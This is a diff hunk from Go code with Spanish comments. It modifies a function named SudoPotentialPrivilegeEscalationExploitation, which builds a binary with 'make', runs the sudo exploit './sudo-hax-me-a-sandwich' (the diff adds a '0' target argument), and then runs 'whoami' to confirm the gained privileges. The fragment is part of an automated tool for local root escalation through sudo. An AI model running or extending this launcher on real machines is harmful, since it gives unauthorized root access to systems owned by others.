@@ -751,15 +751,15 @@ func SudoPotentialPrivilegeEscalationExploitation() {
 	fmt.Println("Comando 'make' ejecutado exitosamente")
 	fmt.Printf("Salida del comando: %s\n", makeOut)
 
-	// Ejecutar './sudo-hax-me-a-sandwich'
-	runCmd := exec.Command("./sudo-hax-me-a-sandwich")
+	// Ejecutar './sudo-hax-me-a-sandwich 0'
+	runCmd := exec.Command("./sudo-hax-me-a-sandwich", "0")
 	runOut, runErr := runCmd.CombinedOutput()
 	if runErr != nil {
-		fmt.Printf("Error al ejecutar './sudo-hax-me-a-sandwich': %v\n", runErr)
+		fmt.Printf("Error al ejecutar './sudo-hax-me-a-sandwich 0': %v\n", runErr)
 		fmt.Printf("Salida del comando: %s\n", runOut)
 		return
 	}
-	fmt.Println("Comando './sudo-hax-me-a-sandwich' ejecutado exitosamente")
+	fmt.Println("Comando './sudo-hax-me-a-sandwich 0' ejecutado exitosamente")
 	fmt.Printf("Salida del comando: %s\n", runOut)
 
 	// Ejecutar 'whoami' para obtener el usuario actual
